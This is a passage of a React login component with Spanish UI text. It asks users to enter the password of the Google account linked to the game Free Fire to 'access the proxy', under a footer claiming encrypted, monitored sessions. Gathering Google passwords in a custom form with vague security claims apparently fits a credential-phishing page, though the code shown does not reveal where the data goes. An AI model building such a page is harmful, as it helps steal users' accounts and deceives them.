                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            {/* Google Sign-In (DESACTIVADO) */}
            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={loading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {loading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;